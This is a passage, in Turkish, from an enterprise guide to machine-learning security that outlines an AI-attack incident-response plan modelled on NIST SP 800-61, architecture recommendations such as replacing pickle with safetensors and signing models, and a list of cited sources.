+Kurumsal siber güvenlik olay müdahale ekipleri (CSIRT), yapay zekaya yönelik bir saldırı gerçekleştiğinde (örneğin kötü amaçlı bir modelin yüklenmesi veya veri sızıntısı), NIST SP 800-61 Rev. 2 kılavuzuna uygun olarak yapılandırılmış aşağıdaki olay müdahale planını uygulamalıdır1:
+
+### **1\. Hazırlık (Preparation)**
+
+* Sistemlerde ModelScan taramaları CI/CD boru hatlarına entegre edilir, tüm üretim modellerinin OMS imza doğrulamaları zorunlu kılınır14.  
+* Çıkarım sunucuları üzerinde Linux Auditd kuralları ve Wazuh ajanları aktif edilerek log akışı SIEM sistemine yönlendirilir8.  
+* Çalışanlara yönelik "Gölge Yapay Zeka" farkındalık eğitimleri verilir10.
+
+### **2\. Algılama ve Analiz (Detection & Analysis)**
+
+* Wazuh SIEM üzerinde secmlops\_detection kural grubundan gelen alarmlar (Level 12\) yakından izlenir8.  
+* Sistem üzerinde çalışan anormal Python alt süreçleri, ağ bağlantıları ve harici paste sitelerine (pastebin vb.) yapılan istekler analiz edilir9.  
+* Sorgu sıklığındaki anormal artışlar izlenerek olası Model Inversion veya Extraction saldırıları tespit edilir30.
+
+### **3\. Sınırlandırma (Containment)**
+
+* Saldırı altında olduğu tespit edilen Kubernetes çıkarım podları, API Gateway katmanında izole edilir (Network Security Group kuralları ile internet ve iç ağ erişimleri kesilir).  
+* Zararlı model dosyası (örneğin compromised\_resnet50.pt) sistemden yalıtılarak analiz edilmek üzere güvenli bir sandbox ortamına taşınır9.  
+* İlgili API anahtarları ve kullanıcı hesapları derhal askıya alınır30.
+
+### **4\. Teşhis ve Temizleme (Eradication & Recovery)**
+
+* Saldırganın sisteme sızmak için kullandığı zafiyet noktası (güvensiz pickle yüklemesi veya sızdırılan API anahtarı) tespit edilerek kapatılır9.  
+* Etkilenen tüm sistemler temizlenir, yedeklerden doğrulanmış ve Cosign ile imzalanmış güvenli model imajları tekrar dağıtılır12.  
+* Sızdırılan hassas veriler varsa, KVKK ve BDDK bildirim süreçleri başlatılır30.
+
+### **5\. Olay Sonrası Faaliyetler (Post-Incident Activity)**
+
+* Saldırının nasıl gerçekleştiği, hangi güvenlik kontrollerinin yetersiz kaldığı analiz edilerek "Öğrenilen Dersler" raporu hazırlanır.  
+* Gelecekte benzer bir saldırıyı engellemek için kurumsal risk matrisi güncellenir ve altyapıdaki Diferansiyel Gizlilik veya imzalama politikaları sıkılaştırılır2.
+
+## **Genel Değerlendirme ve Mimari Tavsiyeler**
+
+Kurumsal siber güvenlik çözüm mimarları ve SOC analistleri, yapay zeka operasyonlarının güvenliğini sağlamak için geleneksel yaklaşımları bir kenara bırakıp yapay zekaya özgü savunma stratejilerini hayata geçirmelidir1. SecMLOps kapsamında hayati öneme sahip mimari tavsiyeler şu şekildedir:
+
+1. **Format Sıkılaştırması:** Kurum içindeki tüm ML projelerinde güvensiz pickle tabanlı model kullanımı tamamen sonlandırılmalı ve yürütülebilir kod içermeyen safetensors formatı standart hale getirilmelidir9.  
+2. **Kriptografik Güven Zinciri:** Açık kaynaklı veya kurum içinde eğitilen tüm modeller, OpenSSF Model Signing (OMS) ve Sigstore anahtarsız imzalama teknolojileriyle kayıt altına alınmalı, imzasız hiçbir modelin üretim ortamında çalıştırılmasına izin verilmemelidir14.  
+3. **Proaktif Mahremiyet Koruması:** Finans ve sağlık verileri gibi hassas verilerle eğitilen modellerin çıkışlarında, Opacus kütüphanesi ve Ghost Clipping yöntemleri kullanılarak Diferansiyel Gizlilik (DP-SGD) zorunlu tutulmalı; model mülkiyetini korumak için ise CodeGuard gibi gelişmiş filigranlama teknikleri uygulanmalıdır31.  
+4. **Mevzuat ve Standart Uyumu:** Tüm yapay zeka sistemleri, yerel mevzuatlar (KVKK, BDDK, 5651\) ve uluslararası standartlar (NIST AI RMF, ISO 27001\) çerçevesinde yapılandırılmalı; çalışma zamanındaki tüm anormallikler Wazuh SIEM ve Auditd entegrasyonu ile 7/24 izlenmelidir5.
+
+#### **Alıntılanan çalışmalar**
+
+1. SecMLOps: A comprehensive framework for integrating security throughout the machine learning operations lifecycle \- PMC, [https://pmc.ncbi.nlm.nih.gov/articles/PMC12894179/](https://pmc.ncbi.nlm.nih.gov/articles/PMC12894179/)  
+2. Artificial intelligence and machine learning Supply chain risks and mitigations, [https://media.defense.gov/2026/Mar/04/2003882809/-1/-1/0/AI\_ML\_SUPPLY\_CHAIN\_RISKS\_AND\_MITIGATIONS.PDF](https://media.defense.gov/2026/Mar/04/2003882809/-1/-1/0/AI_ML_SUPPLY_CHAIN_RISKS_AND_MITIGATIONS.PDF)  
+3. Taming the Wild West of ML: Practical Model Signing with Sigstore \- Google Blog, [https://blog.google/security/taming-wild-west-of-ml-practical-mode/](https://blog.google/security/taming-wild-west-of-ml-practical-mode/)  
+4. A Systematic Survey of Model Extraction Attacks and Defenses: State-of-the-Art and Perspectives \- arXiv, [https://arxiv.org/html/2508.15031v1](https://arxiv.org/html/2508.15031v1)  
+5. AI Governance Guide: Mapping NIST AI RMF to Controls \- Zscaler, Inc., [https://www.zscaler.com/blogs/product-insights/enterprise-ai-governance-nist-ai-rmf-enforceable-controls](https://www.zscaler.com/blogs/product-insights/enterprise-ai-governance-nist-ai-rmf-enforceable-controls)  
+6. Bankacılıkta Yapay Zeka Riskleri Etkileri ve Yönetişimi | Türkiye Bankalar Birliği, [https://egitim.tbb.org.tr/egitimler/bankacilikta-yapay-zeka-riskleri-etkileri-ve-yonetisimi-2451?start\_date=2026-03-30T00:00:00.000Z\&end\_date=2026-03-31T00:00:00.000Z](https://egitim.tbb.org.tr/egitimler/bankacilikta-yapay-zeka-riskleri-etkileri-ve-yonetisimi-2451?start_date=2026-03-30T00:00:00.000Z&end_date=2026-03-31T00:00:00.000Z)  
+7. YAPAY ZEKÂ ALANINDA KİŞİSEL VERİLERİN KORUNMASINA DAİR TAVSİYELER \- KVKK, [https://www.kvkk.gov.tr/SharedFolderServer/CMSFiles/25a1162f-0e61-4a43-98d0-3e7d057ac31a.pdf](https://www.kvkk.gov.tr/SharedFolderServer/CMSFiles/25a1162f-0e61-4a43-98d0-3e7d057ac31a.pdf)  
+8. Monitoring execution of malicious commands \- Proof of Concept guide, [https://documentation.wazuh.com/current/proof-of-concept-guide/audit-commands-run-by-user.html](https://documentation.wazuh.com/current/proof-of-concept-guide/audit-commands-run-by-user.html)  
+9. Poisoned AI: How Hugging Face Became a Malware Distribution Platform \- Hive Security, [https://hivesecurity.gitlab.io/blog/huggingface-ai-supply-chain-attacks-2026/](https://hivesecurity.gitlab.io/blog/huggingface-ai-supply-chain-attacks-2026/)  
+10. İş Yerlerinde Üretken Yapay Zekâ Kullanımı: KVKK Rehberi Işığında Riskler ve Yönetişim, [https://herguner.av.tr/is-yerlerinde-uretken-yapay-zeka-kullanimi-kvkk-rehberi-isiginda-riskler-ve-yonetisim/](https://herguner.av.tr/is-yerlerinde-uretken-yapay-zeka-kullanimi-kvkk-rehberi-isiginda-riskler-ve-yonetisim/)  
+11. SafePickle: Robust and Generic ML Detection of Malicious Pickle-based ML Models \- arXiv, [https://arxiv.org/html/2602.19818v1](https://arxiv.org/html/2602.19818v1)  
+12. Signing Other Types \- Sigstore, [https://docs.sigstore.dev/cosign/signing/other\_types/](https://docs.sigstore.dev/cosign/signing/other_types/)  
+13. Signing Containers \- Sigstore, [https://docs.sigstore.dev/cosign/signing/signing\_with\_containers/](https://docs.sigstore.dev/cosign/signing/signing_with_containers/)  
+14. Container Signing, Verification and Storage in an OCI registry \- Open Policy Agent, [https://openpolicyagent.org/ecosystem/entry/cosign](https://openpolicyagent.org/ecosystem/entry/cosign)  
+15. Sign OCI containers & other artifacts using Sigstore Cosign & CircleCI OIDC tokens, [https://circleci.com/blog/sign-oci-containers-and-other-artifacts-using-sigstore-cosign/](https://circleci.com/blog/sign-oci-containers-and-other-artifacts-using-sigstore-cosign/)  
+16. MITRE ATLAS Overview \- NIST CSRC, [https://csrc.nist.gov/csrc/media/Presentations/2025/mitre-atlas/TuePM2.1-MITRE%20ATLAS%20Overview%20Sept%202025.pdf](https://csrc.nist.gov/csrc/media/Presentations/2025/mitre-atlas/TuePM2.1-MITRE%20ATLAS%20Overview%20Sept%202025.pdf)  
+17. Poisoned Pipelines: Malicious AI Model and Skill Repositories \- Lab Space, [https://labs.cloudsecurityalliance.org/research/csa-research-note-malicious-ai-model-repositories-attack-sur/](https://labs.cloudsecurityalliance.org/research/csa-research-note-malicious-ai-model-repositories-attack-sur/)  
+18. ModelScan \- Protection Against Model Serialization Attacks \- SANS Internet Storm Center, [https://isc.sans.edu/diary/31692](https://isc.sans.edu/diary/31692)  
+19. PickleFuzzer: A Case Study in Fuzzing for Discrepancies Between Python Pickle Implementations \- arXiv, [https://arxiv.org/html/2605.15084](https://arxiv.org/html/2605.15084)  
+20. ModelScan | Protect Models From Attacks, [https://protectai.com/modelscan](https://protectai.com/modelscan)  
+21. Detecting Impacket with Wazuh, [https://wazuh.com/blog/detecting-impacket-with-wazuh/](https://wazuh.com/blog/detecting-impacket-with-wazuh/)  
+22. An Introduction to the OpenSSF Model Signing (OMS) Specification: Model Signing for Secure and Trusted AI Supply Chains, [https://openssf.org/blog/2025/06/25/an-introduction-to-the-openssf-model-signing-oms-specification/](https://openssf.org/blog/2025/06/25/an-introduction-to-the-openssf-model-signing-oms-specification/)  
+23. OpenSSF Model Signing (OMS) Specification \- GitHub, [https://github.com/ossf/model-signing-spec](https://github.com/ossf/model-signing-spec)  
+24. Home · Sigstore, [https://www.sigstore.dev/](https://www.sigstore.dev/)  
+25. How to Sign a Container with Cosign \- Chainguard Academy, [https://edu.chainguard.dev/open-source/sigstore/cosign/how-to-sign-a-container-with-cosign/](https://edu.chainguard.dev/open-source/sigstore/cosign/how-to-sign-a-container-with-cosign/)  
+26. How to sign your ML models using OpenSSF Model signing (OMS) | by Achanandhi M, [https://medium.com/@achanandhi.m/how-to-sign-your-ml-models-using-openssf-model-signing-oms-451fd399ed89](https://medium.com/@achanandhi.m/how-to-sign-your-ml-models-using-openssf-model-signing-oms-451fd399ed89)  
+27. MITRE ATLAS™, [https://atlas.mitre.org/](https://atlas.mitre.org/)  
+28. AI Model Inversion Attack | BlackFog, [https://www.blackfog.com/cybersecurity-101/ai-model-inversion-attack/](https://www.blackfog.com/cybersecurity-101/ai-model-inversion-attack/)  
+29. Model Inversion Attacks: How They Work, Risks, and Defenses \- WitnessAI, [https://witness.ai/blog/model-inversion-attacks/](https://witness.ai/blog/model-inversion-attacks/)  
+30. Model Inversion Attacks: Risks and Defenses Explained \- SentinelOne, [https://www.sentinelone.com/cybersecurity-101/cybersecurity/model-inversion-attacks/](https://www.sentinelone.com/cybersecurity-101/cybersecurity/model-inversion-attacks/)  
+31. Opacus: User-Friendly Differential Privacy Library in PyTorch \- Rutgers DIMACS, [http://archive.dimacs.rutgers.edu/\~graham/pubs/papers/opacus.pdf](http://archive.dimacs.rutgers.edu/~graham/pubs/papers/opacus.pdf)  
+32. Enabling Fast Gradient Clipping and Ghost Clipping in Opacus \- PyTorch, [https://pytorch.org/blog/clipping-in-opacus/](https://pytorch.org/blog/clipping-in-opacus/)  
+33. meta-pytorch/opacus: Training PyTorch models with differential privacy \- GitHub, [https://github.com/meta-pytorch/opacus](https://github.com/meta-pytorch/opacus)  
+34. Implementation of Backdoor-based Model Watermarking methods \- GitHub, [https://github.com/sbaresearch/model-watermarking](https://github.com/sbaresearch/model-watermarking)  
+35. \[2409.06130\] On the Weaknesses of Backdoor-based Model Watermarking: An Information-theoretic Perspective \- arXiv, [https://arxiv.org/abs/2409.06130](https://arxiv.org/abs/2409.06130)  
+36. CodeGuard: A Generalized and Stealthy Backdoor Watermarking for Generative Code Models \- arXiv, [https://arxiv.org/html/2506.20926v1](https://arxiv.org/html/2506.20926v1)  
+37. Untargeted Backdoor Watermark: Towards Harmless and Stealthy Dataset Copyright Protection, [https://papers.neurips.cc/paper\_files/paper/2022/file/55bfedfd31489e5ae83c9ce8eec7b0e1-Paper-Conference.pdf](https://papers.neurips.cc/paper_files/paper/2022/file/55bfedfd31489e5ae83c9ce8eec7b0e1-Paper-Conference.pdf)  
+38. AI security frameworks compared: NIST AI RMF vs MITRE ATLAS vs OWASP | Speakeasy, [https://www.speakeasy.com/resources/ai-security-frameworks](https://www.speakeasy.com/resources/ai-security-frameworks)  
+39. AI Governance Tools & Frameworks: NIST, OWASP, ISO 42001 | Alice, [https://alice.io/blog/ai-risk-management-frameworks-nist-owasp-mitre-maestro-iso](https://alice.io/blog/ai-risk-management-frameworks-nist-owasp-mitre-maestro-iso)  
+40. Using Splunk to Develop Local LLM MCP Mitre Atlas Detections, [https://www.splunk.com/en\_us/blog/artificial-intelligence/splunk-local-llm-mcp-mitre-atlas-detections-guide.html](https://www.splunk.com/en_us/blog/artificial-intelligence/splunk-local-llm-mcp-mitre-atlas-detections-guide.html)  
+41. Üretken Yapay Zekâ ve Kişisel Verilerin Korunması Rehberi (15 Soruda) \- KVKK, [https://www.kvkk.gov.tr/Icerik/8547/uretken-yapay-zeka-ve-kisisel-verilerin-korunmasi-rehberi-15-soruda](https://www.kvkk.gov.tr/Icerik/8547/uretken-yapay-zeka-ve-kisisel-verilerin-korunmasi-rehberi-15-soruda)  
+42. YAPAY ZEKÂ ALANINDA KİŞİSEL VERİLERİN KORUNMASINA DAİR TAVSİYELER, [https://krtknadmn.karatekin.edu.tr/files/kvkk/Rehberler/Yapay%20Zeka%20Alan%C4%B1nda%20Ki%C5%9Fisel%20Verilerin%20Korunmas%C4%B1na%20Dair%20Tavsiyeler%20Rehberi.pdf](https://krtknadmn.karatekin.edu.tr/files/kvkk/Rehberler/Yapay%20Zeka%20Alan%C4%B1nda%20Ki%C5%9Fisel%20Verilerin%20Korunmas%C4%B1na%20Dair%20Tavsiyeler%20Rehberi.pdf)  
+43. BDDK ve KKB'den Finans Sektörüne Yapay Zekâ Yol Haritası \- ParaMedya, [https://www.paramedya.com/devami/140107/bddk-ve-kkbden-finans-sektorune-yapay-zeka-yol-haritasi/](https://www.paramedya.com/devami/140107/bddk-ve-kkbden-finans-sektorune-yapay-zeka-yol-haritasi/)  
+44. BDDK Düzenlemeleri ve Yapay Zeka \- Callby AI, [https://www.callby.ai/tr/blog/bddk-d%C3%BCzenlemeleri-ve-yapay-zeka](https://www.callby.ai/tr/blog/bddk-d%C3%BCzenlemeleri-ve-yapay-zeka)
+
+[image1]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAaCAYAAACzdqxAAAABMklEQVR4XmNgGAX0Bo5A/BqI/yPhX0C8G4iFkdSRDeYA8T8g9kCXoAQIAvFpIH4AxNKoUpQBTSB+C8RrgJgFTY4iEM0ACdtydAlKwSQg/g3ENugSlABY+N4FYnE0OYoAofBlA2JWKFsGiFuBeBoQ2wExI0wRNgAL3yJ0CQaIxiYg1mGAGFoPxJxArArEt4A4CqEUE4DSL67wVQHiuQwQw3yB+BMQ60PlQC7fA8TcUD4KwJd+Qd6fxQDxEQiADLCGioMAKMK3AjEHlI8CjIH4KwNm+EoyQAx9BMSKSOIwIAvEV4DYD13CBYifMSDKhr9A/ASKQWyY+HIGzAgFuXgCEIcyEIg8UgDI0CogdoLyQZGIbjHJAOS6bAZIJIKCSh2IK6HiFAEHBtRgAmGQ60fBKMADAMKPOLgDNpUvAAAAAElFTkSuQmCC>
+
+[image2]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAaCAYAAAC+aNwHAAABE0lEQVR4Xu3TP0tCURjH8SciKBIiBEkolGzR3oEQhDg0BrW3utpUIdHi2NDkElFtvYAImkRBh95BTkLUHtJgYH0f7rmmD8c/c/iDDxzOc+659/y5Iv8+EeziEGnMu/5lrLu2Nxk00cEDjnGPZ2zjCfn+6IEsoIQuTrA0XJYdfOJNPF+gD1fwjQNTC7OIR0fbQyngB6eYM7XB3OHMdm7hHS1smJrNtXjWfyHB28um35cVCZbbjx5VFT3xzDxN4mjjA5umNlXCCZS2x0U3Oms7V/EikyeI4gYxW9BcSrAHe7bgoseqt3HU/ZAEXlHDmqnpbTxHUcbfD0migS/c4ghXqCMnEx4Oo4OS2HdS8vcHzjLLyPwC1vkp/WcUoisAAAAASUVORK5CYII=>
+
+[image3]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABsAAAAaCAYAAABGiCfwAAABiElEQVR4Xu2UTStEURiAX6HId+QjCymULCyUsrJS/ATlB1hYWBE2NhaUDVYSWfpYjIQFi5GdhR+gLMhOUspG+XjeOedO557u3Mw0tyzmqac79z3vPfe+57xnREr8U+pxEddwApvDw8WjCjdwDBfwC9NY6+QUjQ48xiZ732NNBK3sFKf8gaSYwTcc9geiqMQ2q/7Ol158wluJaQ7tIt3cF0zhFvaFMuIpF1PVHR7gDy67CQFdeI87WO2N/YUKXMVLbMBufMYbrHPyMkt1aAc1qRC01XWfRuy9NsoZPorp0Cz9+IqfYtY6cNJNikGr0nZPS/g87UtEZUP4gfNuMA+0kR5wxYkFH7CHZU5cBvFd4l+mS91qrz7By9znO8X0wLgTy6ANoQdR9y2YTL+mJpshsi65u0ur0MbS7g2qmMYTydFs7XiB17gtZq2XxEykzOI3Xkn0/5w+fy7mBUf2qrFYdKJch7kFNyVcsU+jmIMc2qdC0Lae84NJoBXv4oA/kAR6Fkf9YIkSReUXO/88i+kDyMYAAAAASUVORK5CYII=>
